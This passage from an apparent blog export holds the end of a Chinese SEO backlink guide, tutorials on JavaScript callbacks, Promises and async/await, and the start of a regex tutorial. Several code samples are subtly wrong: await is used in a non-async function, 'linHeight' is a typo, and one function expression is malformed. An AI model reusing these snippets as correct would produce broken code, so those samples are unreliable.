曾發布許多良好的內容，單在她的言詞中表示：不論我的內容有多棒，都沒有任何反向連結。\n這就是她決定使用「摩天大樓技術」的時機點。\n因此，她不再只是單純發布另一個良好內容，而是創造出驚人的事物。\n以下是例子：\n她使用電子郵件推廣去創立反向連結，而非單純創造好內容並等待被推廣。\n這使她取得從自然領域的權威網站，取得滿手的連結。\n這些白帽反向連結，使她自然搜尋增加了 194%。\n為何「摩天大樓技術」運作得如此良好？\n:::info\n根據 Julie 所說：\n「讓這件事如此成功的原因，在於建立反向連節就像與他人建立關係。」\n「人們在知道你的網站存在前，不會連結你的內容。」\n「此外，在你主動告訴他們以前，也不會知道你的網站存在。」\n:::\n說的非常好。\n案例二 破損連結優化的回報 去年，我決定執行破損連結優化的行銷活動。\n因此，我遵循在上一章節的流程。\n首先，我使用搜尋字串，以找出含有許多外部連結的網頁。\n接著，我使用 Check My Links 找出破損的連結。\n之後，我寄信給負責該內容的人，並表示自己有發現的破損連結存在。\n（仔細查看該信件有多麼客製化）\n收到對方的回應後，我寄給他們那些失效的連結，以及來自 Backlinko 的一大堆內容，用以進行 1:1 替換。\n而大多數的夥伴，都非常樂意增添我的連結：\n案例三 Matt 如何優化它的電子商務連結 讓我們面對一個事實：\n建立反向連結，對電商網站來說並不容易。\n但他仍有可能，就如同 Matt Lawry 一樣。\n如同多數電商網站擁有者，Matt 對於建立他電商網站的連結有麻煩（一個專注在禮物的澳洲網站）\n畢竟，有誰想要連結到一個 100% 產品導向的頁面。\n這讓 Matt 了解到，它可以使用內容為網站創造反向連結。\n具體來說，Matt 在它的網站創造一篇「摩天大樓」內容：《澳洲琴酒：終極指南》\n當然，Matt 並沒有坐下來並等待連結累積。\n他透過電子郵件，主動推廣自己的內容。\n因為 Matt 聯繫上正確的人（並寄給他們客製化的電子郵件），許多人願意提供連接給他的指南。\n這些連結都加強了 Matt 的電商網站，在搜尋結果頁想要爭取的關鍵字：澳洲琴酒。\n第 8 章：進階連結優化技巧 以下清單，是我為了挑選這幾年，一些進階連結優化的技巧。\n從「連結回收」輕鬆取得反向連結 每當有人在文章中提及你的品牌，他們都會連結你對吧？\n錯。\n我的意思指，他們「應該」連結你，但並非總是會發生。\n以下是我想表達的意思：\n但藉由輕推一把，多數網站擁有人都非常樂意，將提及你的部分轉成一個連結。\n你要如何發現些未含連結的提及呢？BuzzSumo 效果非常好。\n透過反向圖片搜尋，取得「額外」連結 請問你是否發布視覺資產（如資訊圖表、示意圖）？\n如果有，那現在可能有某些網站正使用你的圖片，卻沒有註明來源。\n不要嚇到。事實上，你應該慶祝。\n如同連結重新取得，一封友善的郵件可以將這些機會轉成連結。\n你可以使用 Google 以圖搜尋，找到那些使用你圖片，卻沒有添加連結的人們 :\n在下午寄送電子郵件 以下是我寄送上千封電子郵件後，從中學到的事情。\n在下午（收件者本地時間）寄送你的推廣電子郵件。\n為什麼？\n當你在早上寄送你的訊息，它將會被收件者，與其他 93 封訊息混在一起處理。\n但當你在下午寄送電子，收件夾就會少掉許多競爭者。\n我推薦 Gmail 內建的時間排成功能，幫你規畫推廣信發送時間。\n創造視覺化的概念、點子與策略 以下是來自 Backlinko 實際的作為：\n不管你相不相信，許多人都因為這張簡單片與我連結：\n為何它如此有效？\n恩\u0026hellip;我可以單純透過文字描述 APP 攻勢，但這將使我的內容比較不容易分享。\n另一方面，當你創造一個視覺圖像，你將會擁有部落客樂於分享的內容（並連結你的網站）。\n在結束前寄送試探郵件 你應該在第一封電子郵件推廣中，要求對方提供反向連結嗎？\n簡短回答：可能可以。\n你也可以透過兩階段流程，取得更好的結果。\n（Backlinko 讀者 Mike 發現測試郵件的成效，輾壓直接要求連結的方式）\n這個方法的另一個好處，可以減少你花費的時間。\n與其花費時間，客製化一封沒人閱讀的訊息，先寄送簡短試探郵件更好。\n之後，再針對你下一則訊息進行客製化。\n獲得 Podcast 的訪談 沒錯，客座文章有他的重要地位存在\n但有一個大問題：它需要花費很多時間撰寫！\n進入　Podcast　的世界。\n與其花費時間撰寫大綱、擬草稿、修改客座文章，不如單純出現在 Podcast 節目，並談論你所知道的內容。\n蹦！你就取得了反向連結。\n最好的地方是什麼？\n每個領域都有 Podcast 節目。\n以下反向連節，就是我出現在 Podcast 後建立的。\n使用「連結交集」找出可能連結者 如果某人連結給你的競爭者，他們可能也會提供連結給你對吧？\n沒錯。\n如果某人連結你的 2 位競爭者，他甚至更有可能提供連結給你。\n你如何找到這些，連結超過 1 位以上競爭者的網站。\nSemrush Backlink Gap tool 只要列出 2 到 3 位你最大的網站競爭者。\n這個絕佳的工具，將會向你顯示哪些人與他們連結。\n使用「預先策畫」的連結目標清單 不能否認：找到高品質的反向連結非常困難。\n這是個壞消息。\n好消息是，有些人已經為你預先策畫好，這些高品質的網站\u0026hellip;\n\u0026hellip;以「最佳部落格」清單的形式。\n以下是範例：\n更不用說，如果你再經營一個烘焙部落格，每一個網站清單的頁面，都將會是一個反向連結的好機會。\n你可以透過以下搜尋字詞，找到這些清單：\n最好的「主題」部落格 「主題」部落格清單。 結論 以上這就是我的 2022 連結優化指南。\n從今天的指南中，你最想要優先嘗試哪個策略呢？或你對於某件事有疑問。\n不論如何，在底下留言讓我知道。\n","date":"2022-08-17T00:00:00Z","image":"https://live.staticflickr.com/65535/52290179402_693c7086dc_o.jpg","permalink":"https://wayneblog.ga/2022-08-17/seo-backlinks-building-guide/","title":"SEO 反向連結建立：終極指南(2022)"},{"content":" 參考彭彭 - 回呼函式 Callbacks、Promises 物件、Async/Await 非同步流程控制\n前言 Javascript 的主要特點有兩個：\nSingle Thread (單線程) Synchronous (同步) 當主程式中遇到「非同步」的函式如排程、取資料、讀檔\u0026hellip;等相關的函式時(如：setTimeout、fetch\u0026hellip;等)，主程式並不會停止並等待函式執行完成後才繼續往下跑，而是會將其放到 queue 中直到所有程式碼都跑完了，Javascript 會再回頭到 queue 中按順序將 function 拉回來處理。\n1 2 3 4 5 console.log(\u0026#34;程式開始\u0026#34;); setTimeout(() =\u0026gt; { console.log(\u0026#34;非同步事件\u0026#34;); }, 0) console.log(\u0026#34;程式結束\u0026#34;); 程式開始\n程式結束\n非同步事件 \u0026lt;- 最後執行\n上段的原始碼中，setTimeout 所定義的時間為 0，但因為是屬於非同步事件，因此還是會在其他原始碼運行完以後才執行，在 Ajax 的行為中也是一樣，當需要確保擷取到遠端資料才繼續往下執行時，如果程式碼是依序撰寫的方式，就會無法正確呈現資料，以下舉個例子示範。\n舉例 以下為例，此為一個很基本的回傳n1+n2的結果的函式。\n1 2 3 4 5 6 7 8 9 function add(n1, n2) { return n1+n2; } function test() { let result = add(3, 4); console.log(result) } test(); 1 \u0026gt; 7 但若今天需求需要延遲兩秒再將結果打印出來時。\n1 2 3 4 5 6 7 8 9 10 11 function delayedAdd(n1, n2, delayTime) { window.setTimeout(function() { return n1+n2; }, delayTime); } function test() { let result = delayedAdd(3, 4, 2000); console.log(result); } test(); 1 \u0026gt; undefined 此時會發現打印出來的 result 因為 delayedAdd 還未將結果回傳，導致直接顯示 undefined，此時就需要來解決這種非同步流程的控制。\n方法1：Callbacks 回呼函式 最早期使用的方式，於函式最後設定callback，執行需要做的事情。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // Callback 回呼函式 function delayedAdd(n1, n2, delayTime, callback) { // 設定排程，延遲一段時間後執行 window.setTimeout(function() { // 延遲一段時間之後，計算加法，呼叫 callback 函式 callback(n1+n2); }, delayTime); } function test() { delayedAdd(3, 4, 2000, function(result) { console.log(result); }); } test(); 1 \u0026gt; 7 方法2：Promise 物件 近期於ES6提出的新方式。 建立 promise 物件：new Promise(執行函式) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function delayedAdd(n1, n2, delayTime) { // 建立 Promise，使用resolve或reject回傳 let p = new Promise(function(resolve, reject) { window.setTimeout(function() { resolve(n1+n2); // 呼叫resolve將結果回傳 }, delayTime); }); return p; } function test() { let promise = delayedAdd(3, 4, 2000); promise.then(function(result){ console.log(result); }); } test(); 1 \u0026gt; 7 常見寫法，直接 return promise 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function delayedAdd(n1, n2, delayTime) { // 建立 Promise，使用resolve或reject回傳 return new Promise(function(resolve, reject) { window.setTimeout(function() { resolve(n1+n2); // 呼叫resolve將結果回傳 }, delayTime); }); } function test() { let promise = delayedAdd(3, 4, 2000); promise.then(function(result){ console.log(result); }); } test(); 1 \u0026gt; 7 new Promise(resolve, reject) 的 resolve 與 reject 為 Promise 原生提供，可自行改名但順序不可異動。 resolve 對應.then()且代表成功，而 reject 則對應到 .catch()且代表失敗。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function delayedAdd(n1, n2, delayTime) { // 建立 Promise，使用resolve或reject回傳 return new Promise(function(resolve, reject) { window.setTimeout(function() { reject(n1+n2); // 若使用reject，則需使用.catch }, delayTime); }); } function test() { let promise = delayedAdd(3, 4, 2000); // 因使用 reject 回傳，這裡使用 .catch 來接 promise.catch(function(error){ console.log(error); }); } test(); 1 \u0026gt; 7 方法3：Async/Await ，Promise 的語法糖 Promise的語法糖，以便於更直觀的閱讀與撰寫非同步流程，同 Promise 於ES6提出的新玩意兒。 注意：await 的函式必須要確保有Promise，否則將報錯。 需先宣告為 async 函式，才能使用 await。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 function delayedAdd(n1, n2, delayTime) { // 建立 Promise，使用resolve或reject回傳 return new Promise(function(resolve, reject) { window.setTimeout(function() { resolve(n1+n2); // 若使用reject，則需使用.catch }, delayTime); }); } // 需先宣告為 async 函式，才可使用 await async function test() { let result = await delayedAdd(3, 4, 2000); console.log(result); } test(); 1 \u0026gt; 7 注意：使用 await 時，主程式會確實停止，等待 await 函式執行完成後，才接續往下跑，舉例： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function delayedAdd(n1, n2, delayTime) { // 建立 Promise，使用resolve或reject回傳 return new Promise(function(resolve, reject) { window.setTimeout(function() { resolve(n1+n2); // 若使用reject，則需使用.catch }, delayTime); }); } // 需先宣告為 async 函式，才可使用 await async function test() { let result = await delayedAdd(3, 4, 2000); console.log(result); console.log(\u0026#34;Hello\u0026#34;); } test(); 1 2 \u0026gt; 7 \u0026gt; Hello 延伸一：多個 Promise 的資料處理：Promise.all() 若遇到多個 Promise，且需將各個 Promise 的結果進行運算時，可使用 Promise.all() 來處理。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 function delayedAdd(n1, n2, delayTime) { // 建立 Promise，使用resolve或reject回傳 return new Promise(function(resolve, reject) { window.setTimeout(function() { resolve(n1+n2); // 呼叫resolve將結果回傳 }, delayTime); }); } function test() { let promise1 = delayedAdd(3, 4, 2000); let promise2 = delayedAdd(2, 3, 3000); // 多個 Promise 都完成之後，將其數值相乘 Promise.all([promise1, promise2]).then(function(results){ // 此時 results 為一個陣列 \u0026gt; [7, 5]; let answer = results.reduce(function(total, value) { return total * value; }) console.log(answer); }); } test(); 1 \u0026gt; 35 延伸二：多個 Promise 使用 Async/Await 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function delayedAdd(n1, n2, delayTime) { // 建立 Promise，使用resolve或reject回傳 return new Promise(function(resolve, reject) { window.setTimeout(function() { resolve(n1+n2); // 呼叫resolve將結果回傳 }, delayTime); }); } function test() { let result1 = await delayedAdd(3, 4, 2000); let result2 = await delayedAdd(2, 3, 3000); let answer = result1 * result2; console.log(answer); } test(); 1 \u0026gt; 35 ","date":"2022-08-13T00:00:00Z","image":"https://live.staticflickr.com/65535/52282531224_1f57c841ee_o.jpg","permalink":"https://wayneblog.ga/2022-08-13/js-async-programs/","title":"【Callback、Promise、Async/Await】處理非同步事件"},{"content":" 本文參考網址\n什麼是 async？什麼是 await？ 在 JavaScript 的世界，同步 sync 和非同步 async 的愛恨情仇，就如同偶像劇一般的剪不斷理還亂，特別像是setTimeout、setInterval、MLHttpRequest或fetch這些同步非同步混雜的用法，都會讓人一個頭兩個大，幸好 ES6 出現了 promise，ES7 出現了 async、await，幫助我們可以更容易的進行程式邏輯的撰寫。\n對於同步和非同步，最常見的說法是「同步模式下，每個任務必須按照順序執行，後面的任務必須等待前面的任務執行完成，非同步模式則相反，後面的任務不用等前面的，各自執行各自的任務」，但我覺得這樣實在不容易理解，不容易理解的地方在於「中文」的同步和非同步，可能和實際上的解釋剛好相反了 ( 同步的中文字面意思是「一起走」，非同步的中文意思是「不要一起走」，超容易搞錯的 )，因此如果你跟我一樣也很容易搞錯，可以使用我覺得比較好理解的方法：「同一個步道 vs 不同步道」，透過步道的方式，就更容易明白同步和非同步。\n同步：在「同一個步道」比賽「接力賽跑」，當棒子沒有交給我，我就得等你，不能跑。\n非同步：在「不 ( 非 ) 同步道」比賽「賽跑」，誰都不等誰，只要輪到我跑，我就開始跑。\n在 ES7 裡頭 async 的本質是 promise 的語法糖 ( 包裝得甜甜的比較好吃下肚 )，只要 function 標記為 async，就表示裡頭可以撰寫 await 的同步語法，而 await 顧名思義就是「等待」，它會確保一個 promise 物件都解決 ( resolve ) 或出錯 ( reject ) 後才會進行下一步，當 async function 的內容全都結束後，會返回一個 promise，這表示後方可以使用.then語法來做連接，基本的程式長相就像下面這樣：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 async function a(){ await b(); ..... // 等 b() 完成後才會執行 await c(); ..... // 等 c() 完成後才會執行 await new Promise(resolve=\u0026gt;{ ..... }); ..... // 上方的 promise 完成後才會執行 } a(); a().then(()=\u0026gt;{ ..... // 等 a() 完成後接著執行 }); 利用 async 和 await 做個「漂亮的等待」 比較了解 async 和 await 的意思之後，就來試試看做個「漂亮的等待」，過去有使用 ES6 的 promise 來實現 delay ( 如同下方的程式範例 )，這個 delay 透過.then來完成一步一步的串接，雖然邏輯上很清楚，但若要實作比較複雜的流程，就得把每個程式寫在對應的 callback 裏，也就沒有想像的容易，這就是「不太漂亮的等待」 ( 使用 setTimeout 的做法就是不漂亮的等待 )。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // 不漂亮的等待 const delay = (s) =\u0026gt; { return new Promise(resolve =\u0026gt; { setTimeout(resolve,s); }); }; delay().then(() =\u0026gt; { console.log(1); // 顯示 1 return delay(1000); // 延遲ㄧ秒 }).then(() =\u0026gt; { console.log(2); // 顯示 2 return delay(2000); // 延遲二秒 }).then(() =\u0026gt; { console.log(3); // 顯示 3 }); 如果我們把上面的範例修改為 async 和 await 的寫法，突然就發現程式碼看起來非常的乾淨，因為 await 會等待收到 resolve 之後才會進行後面的動作，如果沒有收到就會一直處在等待的狀態，所以什麼時候該等待，什麼時候該做下一步，就會非常清楚明瞭，這也就是我所謂「漂亮的等待」。\n注意，await 一定得運行在 async function 內！\n1 2 3 4 5 6 7 8 9 10 11 12 13 ~async function{ // ~ 開頭表示直接執行這個 function，結尾有 () const delay = (s) =\u0026gt; { return new Promise(function(resolve){ // 回傳一個 promise setTimeout(resolve,s); // 等待多少秒之後 resolve() }); }; console.log(1); // 顯示 1 await delay(1000); // 延遲ㄧ秒 console.log(2); // 顯示 2 await delay(2000); // 延遲二秒 console.log(3); // 顯示 3 }(); 搭配 Promise 基本上只要有 async 和 await 的地方，就一定有 promise 的存在，promise 顧名思義就是「保證執行之後才會做什麼事情」，剛剛使用了 async、await 和 promise 改善setTimeout這個容易出錯的非同步等待，針對setInterval，也能用同樣的做法修改，舉例來說，下面的程式碼執行之後，並「不會」如我們預期的「先顯示 1，再顯示 haha0\u0026hellip;haha5，最後再顯示 2」，而是「先顯示 1 和 2，然後再出現 haha0\u0026hellip;haha5」，因為雖然程式邏輯是從上往下，但在 count function 裏頭是非同步的語法，導致自己走自己的路，也造成了結果的不如預期。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 const count = (t,s) =\u0026gt; { let a = 0; let timer = setInterval(() =\u0026gt; { console.log(`${t}${a}`); a = a + 1; if(a\u0026gt;5){ clearInterval(timer); } },s); }; console.log(1); count(\u0026#39;haha\u0026#39;, 100); console.log(2); 這時我們可以透過 async、await 和 promise 進行修正，在顯示 1 之後，會「等待」count function 結束後再顯示 2。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ~async function(){ const count = (t,s) =\u0026gt; { return new Promise(resolve =\u0026gt; { let a = 0; let timer = setInterval(() =\u0026gt; { console.log(`${t}${a}`); a = a + 1; if(a\u0026gt;5){ clearInterval(timer); resolve(); // 表示完成 } },s); }); }; console.log(1); await count(\u0026#39;haha\u0026#39;, 100); console.log(2); }(); 除了setTimeout和setInterval，這也可以用於像是「輸入文字」的情境，過去我們要做到「連續輸入」文字，可能要層層疊疊寫個好幾個 callback，現在如果使用 async 和 await，就能夠很簡單的實現連續輸入的情境，程式碼看起來也更乾淨簡潔。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // HTML 為一個輸入框、一個按鈕和一個 h1 標籤 // \u0026lt;input id=\u0026#34;a\u0026#34;\u0026gt;\u0026lt;/input\u0026gt;\u0026lt;button id=\u0026#34;b\u0026#34;\u0026gt;send\u0026lt;/button\u0026gt; // \u0026lt;h1 id=\u0026#34;h\u0026#34;\u0026gt;\u0026lt;/h1\u0026gt; ~async function(){ const input = () =\u0026gt; { return new Promise(resolve =\u0026gt;{ const btnClick = () =\u0026gt;{ h.insertAdjacentHTML(\u0026#39;beforeend\u0026#39;, a.value + \u0026#39;\u0026lt;br/\u0026gt;\u0026#39;); // 輸入後在 h1 裡添加內容 a.value = \u0026#39;\u0026#39;; // 清空輸入框 a.focus(); // 將焦點移至輸入框 b.removeEventListener(\u0026#39;click\u0026#39;, btnClick); // removeEventListener 避免重複綁定事件 resolve(); // 完成 }; b.addEventListener(\u0026#39;click\u0026#39;, btnClick); // 綁定按鈕事件 }); }; h.insertAdjacentHTML(\u0026#39;beforeend\u0026#39;, \u0026#39;開始\u0026lt;br/\u0026gt;\u0026#39;); await input(); // 等待輸入，輸入後才會進行下一步 await input(); await input(); h.insertAdjacentHTML(\u0026#39;beforeend\u0026#39;, \u0026#39;結束\u0026#39;); }(); 搭配 Fetch 在我之前的文章 JavaScript Fetch API 使用教學 已經有提到fetch的用法，因為fetch最後回傳的是 promise，理所當然的透過 async 和 await 操作是最恰當不過的。\n舉例來說，先前往 中央氣象局開放資料平台 可以取得許多氣象資料，找到 局屬氣象站-現在天氣觀測報告 ，複製 JSON 格式的連結 ( 需要註冊登入才能看得到連結 )，透過fetch的json()方法處理檔案，目標顯示出「高雄市的即時氣溫」。\n透過 async 和 await 的美化程式碼，得到的結果完全不需要 callback 的輔助，就能按照我們所期望的順序進行。(先顯示「開始抓氣象」，接著顯示「高雄市的氣溫」，最後顯示「總算結束了」)\n1 2 3 4 5 6 7 8 9 10 11 12 ~async function(){ console.log(\u0026#39;開始抓氣象\u0026#39;); // 先顯示「開始抓氣象」 await fetch(\u0026#39;氣象局 json 網址\u0026#39;) // 帶有 await 的 fetch .then(res =\u0026gt; { return res.json(); }).then(result =\u0026gt; { let city = result.cwbopendata.location[14].parameter[0].parameterValue; let temp = result.cwbopendata.location[14].weatherElement[3].elementValue.value; console.log(`${city}的氣溫為 ${temp} 度 C`); }); console.log(\u0026#39;總算結束了\u0026#39;); // 抓完氣象之後再顯示「總算結束了」 }(); 搭配 迴圈 如果要透過 JavaScript 實現「文字慢慢變大」的效果，除了透過 CSS 的 transition 設定之外，通常就是直接使用setInterval來完成，就像下面的程式碼這樣：\n1 2 3 4 5 6 7 8 9 let size = 30; h.style.lineHeight = 0; const timer = setInterval(()=\u0026gt;{ h.style.fontSize = size + \u0026#39;px\u0026#39;; size = size + 1; if(size \u0026gt;= 130){ clearInterval(timer); } },10); 如果搭配 async 和 await，我們就能將同樣的做法，改由「迴圈」實現，因為使用了 await，所以迴圈每次執行時，都會進行「等待」，也就能做到字體慢慢變大的效果。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // HTML 為一個 h1 標籤 \u0026lt;h1 id=\u0026#34;h\u0026#34;\u0026gt;hello\u0026lt;/h1\u0026gt; ~async function(){ const delay = t =\u0026gt; { // 先撰寫一個等待的 function return new Promise(resolve =\u0026gt; { setTimeout(resolve, t); }); }; h.style.linHeight = 0; for(let i=30; i\u0026lt;130; i++){ h.style.fontSize = i + \u0026#39;px\u0026#39;; await delay(10); // 迴圈每次執行時，都會在這裡等待 10ms } }(); 同樣的，上面提到的 fetch 或是輸入文字，只要做成 await 的方式，都可以放在迴圈裡面使用，例如透過迴圈不斷的 fetch 資料、透過迴圈不斷的輸入文字\u0026hellip;等，這些就不是 callback 方法能容易辦到的囉\n小結 坦白說只要你一但熟悉了 async 和 await，就真的回不去了，雖然說 callback 仍然是程式開發裡必備的功能，但對於同步和非同步之間的轉換，以後就交給 async 和 await 來處理吧！\n","date":"2022-08-13T00:00:00Z","image":"https://live.staticflickr.com/65535/52281246237_dd06bc8ef9_o.png","permalink":"https://wayneblog.ga/2022-08-13/js-async-await/","title":"Javascript 的 Async/Await"},{"content":" 參考網站\n建立正規式 正則表達式的規則稱作 pattern。在 JavaScript 中可以透過 Regular expression literals 的方式或建構式的方式來建立 regular expressions pattern：\n方法一：Regular expression literals script 載入時即編譯，當 pattern 不會改變時，使用此方式定義 pattern 效能較好。 1 var re = /ab+c/; 方法二：Function Constructor 程式執行過程才會被編譯，效能較差，適合用在 regular expression pattern 可能會改變時使用。 1 2 var re = new RegExp(\u0026#39;ab+c\u0026#39;); var myRe = new RegExp(\u0026#39;d(b+)d\u0026#39;, \u0026#39;g\u0026#39;); Regular expression literals 效能較好，適合 pattern 不會改變的情況；\nFunction Constructor 效能較差，適合用在 pattern 可能動態改變的情況。\n使用正規式 在 JavaScript 中可以使用正規式的函式包含：\nRegExp.prototype.test()：搜尋字串中是否有符合的部分，回傳 true/false。 RegExp.prototype.exec()：以陣列回傳字串中匹配到的部分，否則回傳 null。 String.prototype.match()：以陣列回傳字串中匹配到的部分，否則回傳 null。 String.prototype.replace()：尋找字串中匹配的部分，並取代之。 String.prototype.search()：尋找字串中是否有符合的部分，有的話回傳 index，否則回傳 -1。 String.prototype.split()：在字串根據匹配到的項目拆成陣列。 簡單來說，當你想要看字串是否包含某 pattern 時，使用 test 或 search；\n想要更多的資訊（花較多耗效能），則使用 exec 或 match。\n特殊字元 (character) 標籤（flag） 1 2 3 regex = /hello/; // 區分大小寫，匹配 \u0026#34;hello\u0026#34;, \u0026#34;hello123\u0026#34;, \u0026#34;123hello123\u0026#34;, \u0026#34;123hello\u0026#34;，但不匹配 \u0026#34;hell0\u0026#34;, \u0026#34;Hello\u0026#34; regex = /hello/i; // 不區分大小寫，匹配 \u0026#34;hello\u0026#34;, \u0026#34;HelLo\u0026#34;, \u0026#34;123HelLO\u0026#34; regex = /hello/g; // 全域搜尋 ES 2019 新增 /s 的標籤，過去 . 可以用來匹配除了換行符號以外（\\n, \\r）的所有字元：\n1 2 3 // 過去 . 可以匹配到除了「換行符號」以外的所有字元 console.log(/./.test(\u0026#39;\\n\u0026#39;)); // → false console.log(/./.test(\u0026#39;\\r\u0026#39;)); // → false 過去雖然可以使用 [\\w\\W] 來匹配到換行符號，但這不是最好的做法：\n1 2 console.log(/[\\w\\W]/.test(\u0026#39;\\n\u0026#39;)); // → true console.log(/[\\w\\W]/.test(\u0026#39;\\r\u0026#39;)); // → true 在 ES 2019 中，只要最後有標記 /s 的標籤，如此 . 將也能夠匹配到換行符號：\n1 2 console.log(/./s.test(\u0026#39;\\n\u0026#39;)); // → true console.log(/./s.test(\u0026#39;\\r\u0026#39;)); // → true 普通字元 // 1 2 var regex = /a/; var regex = /is/; 反斜線 \\ 1 2 3 4 5 6 /* 在「非」特殊字元前面使用反斜線時，表示要把反斜線後的字當作是特殊字元 */ var regex = /\\b/; // b 原本不是特殊字元，這個 b 要當成特殊字元 /* 在特殊字元前面使用反斜線時，表示要把反斜線後的字當作是「非」特殊字元 */ var regex = /if\\(true/; // ( 原本是特殊字元，但這裡要當成非特殊字元 var regex = /1\\+2=3/; // + 原本是特殊字元，但這裡要當成非特殊字元 任意一個字元 . 可以用來匹配除了換行符號（\\n）以外的所有字元： 1 2 3 var regex = /a.man/; // a*man 都會 match，例如 \u0026#34;acman\u0026#34;, \u0026#34;awman\u0026#34;, 但 \u0026#34;a\\nman\u0026#34; 無法匹配。 var regex = /.a/; // 任何一個字元後加上 a 多個字元 [] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // 小寫 a 或大寫 A var regex = /[aA]/; // 匹配所有不是 a 或 A 的字 var regex = /[^aA]/; // a, e, i, o, u 都會 match var regex = /[aeiou]/; // 英文字母 var regex = /[a-z]/; // 所有小寫的字母，從小寫 a 到小寫 z var regex = /[A-Z]/; // 所有大寫的字母，從大寫 A 到大寫 Z var regex = /[a-zA-Z]/; // 所有英文字母 // 數字 5 ~ 8 var regex = /[5-8]/; 括號 () 套用到所有 1 2 3 var regex = /^a|^the|^an/; // 套用到裡面所有的 var regex = /^(a|the|an)/; // 等同於 不是（除了） ^ 1 2 3 4 5 /* 不是 a 都會 match */ var regex = /[^a]/; /* 不是數字都會 match */ var regex = /[^0-9]/; 多個字元縮寫 keywords：\\d、\\w、\\s、\\b、\\D、\\W、\\S \\d : digit，[0-9] \\w : word，包含英文大小寫、數字、底線，[A-Za-z0-9_] \\s : space，包含 space, tab, form feed, line feed，[\\f\\n\\r\\t\\v\\u00a0\\u1680\\u2000-\\u200a\\u2028\\u2029\\u202f\\u205f\\u3000\\ufeff] \\D : 不是 digit，等同於 [^\\d] \\W : 不是 word，等同於 [^\\w] \\S : 不是 space，等同於 [^\\s] 1 2 3 4 5 6 7 8 9 10 /* 所有 word + e */ var regex = /\\we/; /* 連續兩個任意的數值 */ var regex = /\\d\\d/; /* 句子中結尾為 s 的單字 */ var regex = /s\\b/; var regex = /\\b[a-z]/g; // 句子中各個單字的第一個字母 其他特殊字元： \\t : tab \\b : word boundary，用來比對單字和單字間的空白，/s\\b/ 則會比對句子中最一個字母是 s 的單字 Word boundary \\b、\\B 透過 \\b 可以配對 word boundary，word boundary 指的是一個字元的前後沒有其他任何字元。\n要注意 \\b 和 [\\b] 是不一樣的，[\\b] 是用來配對 backspace。\n1 2 3 // is 這個單字才會被選到，Th`is` 的 is 不會 let matchedResult = \u0026#39;This is an apple.\u0026#39;.match(/\\bis\\b/); // [ \u0026#39;is\u0026#39;, index: 5, input: \u0026#39;This is an apple.\u0026#39; ] 相反地，\\B 則是 non-word boundary：\nBefore the first character of the string, if the first character is not a word character. After the last character of the string, if the last character is not a word character. Between two word characters Between two non-word characters The empty string 1 2 3 4 // 使用 \\B 會配對到 This 中的 is let matchedResult = \u0026#39;This is an apple.\u0026#39;.match(/\\Bis/); // [ \u0026#39;is\u0026#39;, index: 2, input: \u0026#39;This is an apple.\u0026#39; ] 出現次數 * + ? {} {, } keywords： * 、+、?、{次數}、{最少次數, 最多次數} * : 任意次數，等同於{0,} + : 至少一次（後面要跟著），等同於 {1,} ? : 零或一次（有或沒有），等同於 {0,1} {次數} {最少次數, 最多次數} 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 var regex = /abc/; // 找到符合 \u0026#34;abc\u0026#34; var regex = /ab*c/; // *表示前一個單字可以是 0 個或多個，因此 ac, abc, abbbbc 都符合規則 var regex = /n?a/; // n 可有可無 var regex = /a{2}/; // a 要 2 次，所以會是 a var regex = /a{2,4}/; // a 介於 2 次到 4 次之間 var regex = /a{2,}/; // 2 次以上的 a 都可以，大括號後面不要有空格 var regex = /(hello){4}/; // 4 次的 hello，hellohellohellohello var regex = /\\d{3}/; // 3 次的數字 開頭與結尾 keywords：^、$ ^ 開頭 $ 結尾 1 2 3 4 5 6 7 8 9 10 11 12 /* 以 A 開頭的字才會匹配到 */ /^A/gm.test(\u0026#39;Abc\u0026#39;); // true /^A/gm.test(\u0026#39;bac\u0026#39;); // false /* 開頭有 He */ var regex = /^He/; /* 結尾有 llo */ var regex = /llo$/; /* 開頭 He 結尾 llo 中間任意字元可以有任意次數 */ var regex = /^He.*llo$/; 或 | 1 2 3 4 5 // and 或 android，match 到 `and`roid 就不 match `android` var regex = /and|android/; // match 到 android 還是會 match and var regex = /android|and/; LookAround Assertions keywords: x(?=y)、x(?!y) Lookahead assertions: x(?=y)、x(?!y) Lookbehind assertions: (?\u0026lt;=y)x、(?\u0026lt;!y)x Look Ahead ?=：後面需要跟著 ?!：後面不能跟著 1 2 3 4 5 6 7 8 9 10 11 12 // foo(?=bar)，foo 後面要跟著 bar 才會配對到 foo const regexp = /foo(?=bar)/; regexp.exec(\u0026#39;foo\u0026#39;); // null regexp.exec(\u0026#39;bar\u0026#39;); // null regexp.exec(\u0026#39;foobar\u0026#39;); // [ \u0026#39;foo\u0026#39;, index: 0, input: \u0026#39;foobar\u0026#39;, groups: undefined ] // foo(?!bar)，foo 後面不能跟著 bar，如此才會配對到 foo const regexp = /foo(?!bar)/; regexp.exec(\u0026#39;foo\u0026#39;); // [ \u0026#39;foo\u0026#39;, index: 0, input: \u0026#39;foo\u0026#39;, groups: undefined ] regexp.exec(\u0026#39;foo123\u0026#39;); // [ \u0026#39;foo\u0026#39;, index: 0, input: \u0026#39;foo123\u0026#39;, groups: undefined ] regexp.exec(\u0026#39;bar\u0026#39;); // null regexp.exec(\u0026#39;foobar\u0026#39;); // null Look Behind ?\u0026lt;=：前面需要跟著才會匹配到 ?\u0026lt;!：前面不能跟著才會匹配到 1 2 3 4 5 6 7 8 9 10 11 12 // (?\u0026lt;=foo)bar，當 bar 前面有 foo 時才會配對到 bar const regexp = /(?\u0026lt;=foo)bar/; regexp.exec(\u0026#39;foo\u0026#39;); // null regexp.exec(\u0026#39;bar\u0026#39;); // null 